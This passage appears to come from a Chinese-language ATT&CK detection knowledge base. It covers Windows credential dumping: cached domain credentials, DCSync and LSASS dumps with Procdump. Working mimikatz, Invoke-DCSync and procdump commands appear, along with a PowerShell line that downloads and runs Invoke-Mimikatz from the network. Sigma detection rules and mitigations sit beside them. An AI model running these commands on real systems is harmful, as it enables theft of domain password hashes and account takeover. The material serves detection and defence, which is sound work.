<p>\u6ce8\u610f\u6743\u9650\u95ee\u9898\uff08administrator\uff09\uff0c\u5982\u679c\u6743\u9650\u5b58\u5728\u95ee\u9898\u9700\u8981\u6267\u884c\u4ee5\u4e0a\u547d\u4ee4\u3002\u5982\u679c\u6743\u9650\u6ca1\u6709\u95ee\u9898\u5efa\u8bae\u6267\u884c\u4ee5\u4e0b\u547d\u540d\uff1a</p> <pre><code>mimikatz.exe  \"privilege::debug\"   \"LSADUMP::Cache\"\n</code></pre>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-005-win-DCC2-mimikatz%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>\u6682\u65e0</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-005-win-DCC2-mimikatz%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-005-win-DCC2-mimikatz%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#sigma","title":"sigma\u89c4\u5219","text":"<pre><code>title: Mimikatz\u4f7f\u7528\ntags:\n    - attack.s0002\n    - attack.t1003\n    - attack.lateral_movement\nlogsource:\n    product: windows\ndetection:\n    keywords:\n        Message:\n        - \"* mimikatz *\"\n        - \"* mimilib *\"\n        - \"* &lt;3 eo.oe *\"\n        - \"* eo.oe.kiwi *\"\n        - \"* privilege::debug *\"\n        - \"* sekurlsa::logonpasswords *\"\n        - \"* lsadump::sam *\"\n        - \"* mimidrv.sys *\"\n        - \"* p::d *\"\n        - \"* s::l *\"\n    condition: keywords\nfalsepositives:\n    - Naughty administrators\n    - Penetration test\nlevel: critical\n</code></pre>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-005-win-DCC2-mimikatz%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#_6","title":"\u5efa\u8bae","text":"<p>\u6682\u65e0</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-005-win-DCC2-mimikatz%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1003-005</p> <p>https://attack.mitre.org/techniques/T1003/005</p> <p>\u4f60\u5e76\u4e0d\u61c2 Mimikatz Part 2 - MSCACHE</p> <p>https://baijiahao.baidu.com/s?id=1611304657392579351</p> <p>DCC2\u7b97\u6cd5\u4ecb\u7ecd</p> <p>https://openwall.info/wiki/john/MSCash2</p> <p>Windows\u5bc6\u7801\u7f13\u5b58\uff08mscache / mscash\uff09v2</p> <p>https://www.jedge.com/wordpress/windows-password-cache-mscache-mscash-v2/</p> <p>\u8f6c\u50a8\u548c\u7834\u89e3mscash-\u7f13\u5b58\u7684\u57df\u51ed\u636e</p> <p>https://ired.team/offensive-security/credential-access-and-credential-dumping/dumping-and-cracking-mscash-cached-domain-credentials</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-006-win-DCsysnc-%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/","title":"T1003-006-windows-\u57fa\u4e8eDCsync\u51ed\u8bc1\u83b7\u53d6","text":""},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-006-win-DCsysnc-%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u901a\u8fc7\u6ee5\u7528Windows\u57df\u63a7\u5236\u5668\u7684\u5e94\u7528\u7a0b\u5e8f\u7f16\u7a0b\u63a5\u53e3\uff08API\uff09\u6765\u8bbf\u95ee\u51ed\u636e\u548c\u5176\u4ed6\u654f\u611f\u4fe1\u606f\uff0c\u4ece\u800c\u4f7f\u7528\u79f0\u4e3aDCSync\u7684\u6280\u672f\u6765\u6a21\u62df\u6765\u81ea\u8fdc\u7a0b\u57df\u63a7\u5236\u5668\u7684\u590d\u5236\u8fc7\u7a0b\u3002</p> <p>\u57df\u63a7\u5236\u5668\u4e0a\u7684Administrators\uff0cDomain Admins\u548cEnterprise Admin\u7ec4\u6216\u8ba1\u7b97\u673a\u5e10\u6237\u7684\u6210\u5458\u80fd\u591f\u8fd0\u884cDCSync\u6765\u4eceActive Directory\u4e2d\u63d0\u53d6\u5bc6\u7801\u6570\u636e\uff0c\u5176\u4e2d\u53ef\u80fd\u5305\u62ec\u6f5c\u5728\u6709\u7528\u5e10\u6237\uff08\u4f8b\u5982KRBTGT\u548c\u7ba1\u7406\u5458\u3002\u7136\u540e\uff0c\u8fd9\u4e9b\u6563\u5217\u53c8\u53ef\u4ee5\u7528\u4e8e\u521b\u5efa\u201c\u9ec4\u91d1\u7968\u8bc1\u201d\uff0c\u4ee5\u7528\u4e8e\u201c\u4f20\u9012\u7968\u8bc1\u201d \u6216\u66f4\u6539\u201c \u5e10\u6237\u64cd\u4f5c\u201d\u4e2d\u6240\u8ff0\u7684\u5e10\u6237\u5bc6\u7801\u3002</p> <p>DCSync\u529f\u80fd\u5df2\u88ab\u5217\u5165\u201clsadump\u201d\u6a21\u5757\u4e2dMimikatz\u3002Lsadump\u8fd8\u5305\u62ecNetSync\uff0c\u5b83\u901a\u8fc7\u65e7\u7248\u590d\u5236\u534f\u8bae\u6267\u884cDCSync\u3002</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-006-win-DCsysnc-%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#dcsync","title":"DCsync","text":"<p>DCSync \u662f\u4e00\u79cd\u540e\u671f\u6740\u4f24\u94fe\u653b\u51fb\uff0c\u5141\u8bb8\u653b\u51fb\u8005\u6a21\u62df\u57df\u63a7\u5236\u5668\uff08DC\uff09\u7684\u884c\u4e3a\uff0c\u4ee5\u4fbf\u901a\u8fc7\u57df\u590d\u5236\u68c0\u7d22\u5bc6\u7801\u6570\u636e\u3002\u4e00\u65e6\u653b\u51fb\u8005\u53ef\u4ee5\u8bbf\u95ee\u5177\u6709\u57df\u590d\u5236\u6743\u9650\u7684\u7279\u6743\u5e10\u6237\uff0c\u653b\u51fb\u8005\u5c31\u53ef\u4ee5\u5229\u7528\u590d\u5236\u534f\u8bae\u6765\u6a21\u4eff\u57df\u63a7\u5236\u5668\u3002</p> <p></p> <p>DCSync  \u672c\u8eab\u662fMimikatz\u4e2d\u7684\u4e00\u4e2a\u547d\u4ee4\uff0c  \u5b83 \u4f9d\u8d56\u4e8e\u5229\u7528Microsoft\u76ee\u5f55\u590d\u5236\u670d\u52a1\u8fdc\u7a0b\u534f\u8bae\uff08MS-DRSR\uff09\u4e2d\u7684\u7279\u5b9a\u547d\u4ee4\u6765\u6a21\u62df\u57df\u63a7\u5236\u5668\u7684\u884c\u4e3a\uff0c\u5e76\u8981\u6c42\u5176\u4ed6\u57df\u63a7\u5236\u5668\u4f7f\u7528\u76ee\u5f55\u590d\u5236\u670d\u52a1\u8fdc\u7a0b\u534f\u8bae\u6765\u590d\u5236\u4fe1\u606f  \uff08MS-DRSR\uff09\u3002\u5229\u7528\u8fd9\u4e9b\u534f\u8bae\uff0c\u6b64\u653b\u51fb\u5229\u7528\u4e86Active Directory\u7684\u6709\u6548\u548c\u5fc5\u8981\u529f\u80fd\uff0c\u65e0\u6cd5\u5173\u95ed\u6216\u7981\u7528\u5b83\u4eec\u3002</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-006-win-DCsysnc-%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#dcsync_1","title":"DCsync\u653b\u51fb\u539f\u7406","text":"<p>\u4e00\u822c\u6765\u8bf4\uff0cDCSYNC\u653b\u51fb\u7684\u5de5\u4f5c\u65b9\u5f0f\u5982\u4e0b\uff1a</p> <ol> <li>\u53d1\u73b0\u57df\u63a7\u5236\u5668\u4ee5\u8bf7\u6c42\u590d\u5236\u3002</li> <li>\u4f7f\u7528GetNCChanges \u51fd\u6570\u8bf7\u6c42\u7528\u6237\u590d\u5236 \u3002</li> <li>DC\u5c06\u590d\u5236\u6570\u636e\u8fd4\u56de\u7ed9\u8bf7\u6c42\u8005\uff0c\u5305\u62ec\u5bc6\u7801\u54c8\u5e0c\u503c\u3002</li> </ol> <p></p> <p>DCSync\u7684\u7ecf\u5178\u7528\u4f8b\u662f\u4f5c\u4e3aGolden Ticket \u653b\u51fb\u7684\u524d\u8eab\uff0c\u56e0\u4e3a\u5b83\u53ef\u7528\u4e8e\u68c0\u7d22KRBTGT HASH\u3002</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-006-win-DCsysnc-%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#_1","title":"\u6240\u9700\u6743\u9650","text":"<p>\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff0c\u4e3a\u4e86\u6267\u884c\u6b64\u653b\u51fb\uff0c\u9700\u8981\u4e00\u4e9b\u975e\u5e38\u7279\u6743\u7684\u6743\u9650\u3002\u8fd9\u5c31\u662f\u4e3a\u4ec0\u4e48\u8fd9\u79cd\u653b\u51fb\u88ab\u5f52\u7c7b\u4e3a\u5728\u6740\u4f24\u94fe\u653b\u51fb\u7684\u540e\u671f\u53d1\u751f\u7684\u539f\u56e0\uff0c\u5e76\u4e14\u653b\u51fb\u8005\u901a\u5e38\u9700\u8981\u4e00\u4e9b\u65f6\u95f4\u624d\u80fd\u83b7\u5f97\u8fd9\u4e9b\u6743\u9650\u3002</p> <p>\u901a\u5e38\uff0c\u7ba1\u7406\u5458\uff0c\u57df\u7ba1\u7406\u5458\uff0c\u4f01\u4e1a\u7ba1\u7406\u5458\u62e5\u6709\u6240\u9700\u7684\u6743\u9650\uff0c\u4f46\u66f4\u5177\u4f53\u5730\u8bf4\uff0c\u9700\u8981\u4ee5\u4e0b\u6743\u9650\uff1a</p> <ul> <li>\u590d\u5236\u76ee\u5f55\u66f4\u6539</li> <li>\u590d\u5236\u76ee\u5f55\u5168\u90e8\u66f4\u6539</li> <li>\u5728\u7b5b\u9009\u96c6\u4e2d\u590d\u5236\u76ee\u5f55\u66f4\u6539</li> </ul>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-006-win-DCsysnc-%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#_2","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>DCSync\u662fmimikatz\u57282015\u5e74\u6dfb\u52a0\u7684\u4e00\u4e2a\u529f\u80fd\uff0c\u7531Benjamin DELPY gentilkiwi\u548cVincent LE TOUX\u5171\u540c\u7f16\u5199\uff0c\u80fd\u591f\u7528\u6765\u5bfc\u51fa\u57df\u5185\u6240\u6709\u7528\u6237\u7684hash.</p> <p>\u5229\u7528\u6761\u4ef6\uff1a</p> <p>\u83b7\u5f97\u4ee5\u4e0b\u4efb\u4e00\u7528\u6237\u7684\u6743\u9650\uff1a</p> <ul> <li>Administrators\u7ec4\u5185\u7684\u7528\u6237</li> <li>Domain Admins\u7ec4\u5185\u7684\u7528\u6237</li> <li>Enterprise Admins\u7ec4\u5185\u7684\u7528\u6237</li> <li>\u57df\u63a7\u5236\u5668\u7684\u8ba1\u7b97\u673a\u5e10\u6237</li> </ul> <p>\u5229\u7528DRS(Directory Replication Service)\u534f\u8bae\u901a\u8fc7IDL_DRSGetNCChanges\u4ece\u57df\u63a7\u5236\u5668\u590d\u5236\u7528\u6237\u51ed\u636e</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-006-win-DCsysnc-%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#1mimikatz","title":"1.\u4f7f\u7528mimikatz","text":"<p>\u5bfc\u51fa\u57df\u5185\u6240\u6709\u7528\u6237\u7684hash\uff1a</p> <pre><code>mimikatz.exe privilege::debug \"lsadump::dcsync /domain:abcc.org /all /csv\" exit\n</code></pre> <p>\u5bfc\u51fa\u57df\u5185administrator\u5e10\u6237\u7684hash\uff1a</p> <pre><code>mimikatz.exe privilege::debug \"lsadump::dcsync /domain:abcc.org /user:administrator /csv\" exit\n</code></pre>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-006-win-DCsysnc-%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#2powershell","title":"2.powershell\u5b9e\u73b0","text":"<p>\u901a\u8fc7Invoke-ReflectivePEinjection\u8c03\u7528mimikatz.dll\u4e2d\u7684dcsync\u529f\u80fd</p> <p>\u5bfc\u51fa\u57df\u5185\u6240\u6709\u7528\u6237\u7684hash\uff1a</p> <pre><code>Invoke-DCSync -DumpForest | ft -wrap -autosize\n</code></pre> <p>\u5bfc\u51fa\u57df\u5185administrator\u5e10\u6237\u7684hash\uff1a</p> <pre><code>Invoke-DCSync -DumpForest -Users @(\"administrator\") | ft -wrap -autosize\n</code></pre>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-006-win-DCsysnc-%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#_3","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>windows \u5b89\u5168\u65e5\u5fd7</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-006-win-DCsysnc-%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#_4","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>\u590d\u73b0\u65b9\u6cd5\u5206\u4e3a\u4e24\u7c7b\uff1a\u672c\u5730\u3001\u8fdc\u7a0b</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-006-win-DCsysnc-%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#dcsyncpowershellinvoke-mimikatz","title":"\u573a\u666f:\u5728\u672c\u5730\u8fd0\u884cDCsync,\u5229\u7528powershell\u811a\u672cInvoke-Mimikatz","text":"<p>\u5728Windows\u57df\u63a7\u670d\u52a1\u5668\u4e0a\u542f\u52a8powershell\uff0c\u7136\u540e\u4e0b\u8f7dInvoke-Mimikatz\u3002</p> <pre><code>iex (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1')\n</code></pre> <p>\u5b8c\u6210\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\u8fd0\u884cDCSync\u3002</p> <pre><code>Invoke-Mimikatz -Command '\"lsadump::dcsync /user:krbtgt /domain:0day.org\"'\n</code></pre>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-006-win-DCsysnc-%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#_5","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>windows \u5b89\u5168\u65e5\u5fd7\uff0c4662\uff08\u5728\u5bf9\u8c61\u4e0a\u5df2\u6267\u884c\u64cd\u4f5c\uff09\uff0c\u7279\u5f81\u503c\uff1a1131f6ad-9c07-11d1-f79f-00c04fc2dcd2\uff0c\u63a7\u5236\u8bbf\u95ee</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-006-win-DCsysnc-%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#_6","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":"<p>DCSync\u662f\u4e00\u4e2a\u5f3a\u5927\u7684\u5de5\u5177\uff0c\u5728\u7ea2\u8272\u56e2\u961f\u6210\u5458\u624b\u4e2d\uff0c\u5bf9\u4e8e\u84dd\u8272\u56e2\u961f\u6210\u5458\u800c\u8a00\uff0c\u8fd9\u662f\u4e00\u573a\u5669\u68a6\u3002\u5bf9\u4e8e\u84dd\u961f\uff0c\u4e00\u5207\u90fd\u4e0d\u4f1a\u4e22\u5931\u3002\u505c\u6b62\u8fd9\u79cd\u653b\u51fb\u53ef\u80fd\u4e0d\u53ef\u884c\uff0c\u4f46\u53ef\u4ee5\u5c06\u5176\u68c0\u6d4b\u51fa\u6765\u3002</p> <p>\u68c0\u6d4b\u65b9\u6cd5\uff1a \u7f51\u7edc\u76d1\u63a7 \u3001\u4e8b\u4ef6ID\u68c0\u6d4b</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-006-win-DCsysnc-%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#sigma","title":"sigma\u89c4\u5219","text":"<pre><code>title: \u5728DCSync\u4f4d\u7f6e\u8fdb\u884c\u68c0\u6d4b\ndescription: windows server 2008 \u6d4b\u8bd5\u7ed3\u679c\uff08\u57df\u63a7\u672c\u5730\uff09\nreferences: https://yojimbosecurity.ninja/dcsync/\ntags: T1003-006\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID: 4662 #\u5728\u5bf9\u8c61\u4e0a\u5df2\u6267\u884c\u64cd\u4f5c\u3002\n        Operationtype: 'Obeject Access' #\u64cd\u4f5c&gt;\u64cd\u4f5c\u7c7b\u578b\n        Access: '\u8bbf\u95ee\u63a7\u5236' #\u64cd\u4f5c&gt;\u8bbf\u95ee\n        Properties:\n             - '*1131f6aa-9c07-11d1-f79f-00c04fc2dcd2*'  #\u7279\u5f81\u503c mimikatz\u5bfc\u51fa\u57df\u8d26\u6237\n             - '*1131f6ad-9c07-11d1-f79f-00c04fc2dcd2*'  #\u7279\u5f81\u503c mimikatz\u5bfc\u51faadministrator\n             - \u2018*89e95b76-444d-4c62-991a-0facbeda640c*\u2019  #\u7279\u5f81\u503c\n    condition: selection\nlevel: medium\n</code></pre>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-006-win-DCsysnc-%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#_7","title":"\u5efa\u8bae","text":"<p>\u6682\u65e0</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-006-win-DCsysnc-%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#_8","title":"\u7f13\u89e3\u63aa\u65bd\u53ca\u4e34\u65f6\u6027\u89e3\u51b3\u65b9\u6848","text":"<p>\u514d\u53d7DCSync\u653b\u51fb\u7684\u6700\u4f73\u4fdd\u62a4\u662f\u63a7\u5236\u8d1f\u8d23\u5141\u8bb8\u5e10\u6237\u590d\u5236\u66f4\u6539\u7684\u57df\u6743\u9650\u3002\u4e0d\u53ef\u907f\u514d\u5730\uff0c\u67d0\u4e9b\u7528\u6237\u5c06\u62e5\u6709\u6b64\u6743\u5229\uff0c\u56e0\u6b64\u5e94\u53d7\u5230\u4fdd\u62a4\u3002</p> <p>\u4e3a\u907f\u514d\u5c06\u7279\u6743\u5bc6\u7801\u8be6\u7ec6\u4fe1\u606f\u5b58\u50a8\u5728\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u7834\u574f\u5b83\u4eec\u7684\u4f4d\u7f6e\uff0c\u5e94\u4f7f\u7528\u5206\u5c42\u7684\u767b\u5f55\u534f\u8bae\u6765\u9632\u6b62\u7279\u6743\u5e10\u6237\u767b\u5f55\u5230\u53ef\u4ee5\u4ece\u5185\u5b58\u4e2d\u8f6c\u50a8\u5176\u5bc6\u7801\u54c8\u5e0c\u503c\u5e76\u7528\u4e8e\u83b7\u53d6\u6267\u884c\u5bc6\u7801\u6240\u9700\u6743\u9650\u7684\u670d\u52a1\u5668\u548c\u5de5\u4f5c\u7ad9\u3002</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-006-win-DCsysnc-%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#_9","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1003-006</p> <p>https://attack.mitre.org/techniques/T1003/006</p> <p>\u4ec0\u4e48\u662fDCSYNC\uff1f\u4e00\u4e2a\u4ecb\u7ecd</p> <p>https://blog.stealthbits.com/what-is-dcsync/</p> <p>\u57df\u6e17\u900f\u2014\u2014DCSync</p> <p>https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-DCSync/</p> <p>DCsync\u5229\u7528\u539f\u7406</p> <p>https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/f977faaa-673e-4f66-b9bf-48c640241d47</p> <p>powershell\u5de5\u5177\u5b9e\u73b0</p> <p>https://gist.github.com/monoxgas/9d238accd969550136db</p> <p>DCsysnc\u68c0\u6d4b</p> <p>https://yojimbosecurity.ninja/dcsync/</p> <p>Active Directory\u590d\u5236</p> <p>https://github.com/hunters-forge/ThreatHunter-Playbook/blob/master/library/active_directory_replication.md</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-win-Procdump%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/","title":"T1003-windows-Procdump\u660e\u6587\u51ed\u8bc1","text":""},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-win-Procdump%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u51ed\u8bc1\u83b7\u53d6\u662f\u4ece\u64cd\u4f5c\u7cfb\u7edf\u548c\u8f6f\u4ef6\u4e2d\u83b7\u53d6\u767b\u5f55\u4fe1\u606f\u548c\u5bc6\u7801\u7684\u8fc7\u7a0b\uff0c\u901a\u5e38\u4e3aHASH\u6563\u5217\u6216\u660e\u6587\u5bc6\u7801\u3002\u7136\u540e\u4f7f\u7528\u51ed\u8bc1\u8fdb\u884c\u6a2a\u5411\u79fb\u52a8\u8bbf\u95ee\u5176\u4ed6\u7cfb\u7edf\u3002</p> <p>\u7528\u6237\u767b\u5f55\u7cfb\u7edf\u540e\uff0c\u4f1a\u751f\u6210\u5404\u79cd\u51ed\u636e\u5e76\u5c06\u5176\u5b58\u50a8\u5728\u5185\u5b58\u4e2d\u7684\u672c\u5730\u5b89\u5168\u673a\u6784\u5b50\u7cfb\u7edf\u670d\u52a1\uff08LSASS\uff09\u8fdb\u7a0b\u4e2d\u3002\u8fd9\u4e9b\u51ed\u8bc1\u53ef\u4ee5\u7531\u7ba1\u7406\u7528\u6237\u6216SYSTEM\u8fdb\u884c\u7ba1\u7406\u3002</p> <p>SSPI\u662fSecurity Support Provider Interface\uff08Microsoft\u5b89\u5168\u652f\u6301\u63d0\u4f9b\u5668\u63a5\u53e3\uff09\u7684\u82f1\u6587\u7f29\u5199\u3002\u5b89\u5168\u652f\u6301\u63d0\u4f9b\u7a0b\u5e8f\u63a5\u53e3\uff08SSPI\uff09\u5141\u8bb8\u5e94\u7528\u7a0b\u5e8f\u4f7f\u7528\u8ba1\u7b97\u673a\u6216\u7f51\u7edc\u4e0a\u53ef\u7528\u7684\u5404\u79cd\u5b89\u5168\u6a21\u578b\uff0c\u800c\u65e0\u9700\u66f4\u6539\u5b89\u5168\u7cfb\u7edf\u7684\u63a5\u53e3\u3002SSPI\u4e0d\u4f1a\u8bb0\u5f55\u767b\u5f55\u51ed\u636e\uff0c\u56e0\u4e3a\u8fd9\u901a\u5e38\u662f\u64cd\u4f5c\u7cfb\u7edf\u5904\u7406\u7684\u7279\u6743\u64cd\u4f5c\u3002</p> <p>\u4e00\u4e2a\u5b89\u5168\u652f\u6301\u63d0\u4f9b\u5546\uff08SSP\uff09\u5305\u542b\u5728\u4e00\u4e2a\u52a8\u6001\u94fe\u63a5\u5e93\uff0c\u901a\u8fc7\u4f7f\u4e00\u4e2a\u6216\u591a\u4e2a\u5b9e\u73b0SSPI\uff08DLL\uff09\u5b89\u5168\u5305\u63d0\u4f9b\u7ed9\u5e94\u7528\u7a0b\u5e8f\u3002\u6bcf\u4e2a\u5b89\u5168\u5305\u90fd\u63d0\u4f9b\u5e94\u7528\u7a0b\u5e8f\u7684SSPI\u51fd\u6570\u8c03\u7528\u548c\u5b9e\u9645\u5b89\u5168\u6a21\u578b\u7684\u529f\u80fd\u4e4b\u95f4\u7684\u6620\u5c04\u3002</p> <p>\u4ee5\u4e0bSSP\u53ef\u7528\u4e8e\u83b7\u53d6\u51ed\u8bc1\uff1a</p> <p>Msv\uff1a\u4ea4\u4e92\u5f0f\u767b\u5f55\uff0c\u6279\u91cf\u767b\u5f55\u548c\u670d\u52a1\u767b\u5f55\u901a\u8fc7MSV\u8eab\u4efd\u9a8c\u8bc1\u5305\u5b8c\u6210\uff1b</p> <p>Wdigest\uff1a\u6458\u8981\u8ba4\u8bc1\u534f\u8bae\u8bbe\u8ba1\u7528\u4e8e\u8d85\u6587\u672c\u4f20\u8f93\u534f\u8bae\uff08HTTP\uff09\u548c\u7b80\u5355\u8ba4\u8bc1\u5b89\u5168\u5c42\uff08SASL\uff09\u4ea4\u6362\uff1b</p> <p>Kerberos\uff1aKerberos V5\u8eab\u4efd\u9a8c\u8bc1\u534f\u8bae\u63d0\u4f9b\u4e00\u4e2a\u5728\u5ba2\u6237\u7aef\u8ddf\u670d\u52a1\u5668\u7aef\u4e4b\u95f4\u6216\u8005\u670d\u52a1\u5668\u4e0e\u670d\u52a1\u5668\u4e4b\u95f4\u7684\u8eab\u4efd\u9a8c\u8bc1\u673a\u5236 \uff08\u5e76\u4e14\u662f\u76f8\u4e92\u7684\u8eab\u4efd\u9a8c\u8bc1\u673a\u5236\uff09\uff1b</p> <p>CredSSP\uff1a\u4e3a\u8fdc\u7a0b\u684c\u9762\u670d\u52a1\u63d0\u4f9bSSO\u548c\u7f51\u7edc\u7ea7\u522b\u8eab\u4efd\u9a8c\u8bc1\uff1b</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-win-Procdump%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>\u4ee5\u4e0b\u5de5\u5177\u53ef\u7528\u4e8e\u679a\u4e3e\u51ed\u636e\uff1a</p> <ul> <li>Windows\u51ed\u636e\u7f16\u8f91\u5668</li> <li>Mimikatz</li> </ul> <p>\u9664\u4e86\u5185\u5b58\u6280\u672f\uff0cLSASS\u8fdb\u7a0b\u5185\u5b58\u53ef\u4ee5\u4ece\u76ee\u6807\u4e3b\u673a\u8f6c\u50a8\u5e76\u5728\u672c\u5730\u7cfb\u7edf\u4e0a\u8fdb\u884c\u5206\u6790\u3002</p> <p>\u4f8b\u5982\uff0c\u5728\u76ee\u6807\u4e3b\u673a\u4e0a\u4f7f\u7528procdump\uff1a</p> <ul> <li>procdump -ma lsass.exe lsass_dump</li> </ul> <p>\u5728\u672c\u5730\uff0c\u8fd0\u884cmimikatz\uff1a</p> <ul> <li>sekurlsa::Minidump lsassdump.dmp</li> <li>sekurlsa::logonPasswords</li> </ul>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-win-Procdump%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>sysmon\u65e5\u5fd7</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-win-Procdump%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>\u573a\u666f\uff1a\u653b\u51fb\u8005\u5229\u7528Procdump\u83b7\u53d6lsass\u8fdb\u7a0b\u5185\u5b58\u6587\u4ef6\uff0c\u672c\u5730\u4f7f\u7528mimikatz\u83b7\u53d6\u5bc6\u7801(administrator)\u3002</p> <pre><code>Microsoft Windows [\u7248\u672c 6.1.7601]\n\u7248\u6743\u6240\u6709 (c) 2009 Microsoft Corporation\u3002\u4fdd\u7559\u6240\u6709\u6743\u5229\u3002\n\nC:\\Users\\Administrator&gt;cd C:\\Users\\Administrator\\Desktop\\Procdump\n\nC:\\Users\\Administrator\\Desktop\\Procdump&gt;procdump64.exe -ma lsass.exe 1.dmp\n\nProcDump v8.0 - Writes process dump files\nCopyright (C) 2009-2016 Mark Russinovich\nSysinternals - www.sysinternals.com\nWith contributions from Andrew Richards\n\n[13:42:47] Dump 1 initiated: C:\\Users\\Administrator\\Desktop\\Procdump\\1.dmp\n[13:42:50] Dump 1 writing: Estimated dump file size is 50 MB.\n[13:42:51] Dump 1 complete: 50 MB written in 3.3 seconds\n[13:42:51] Dump count 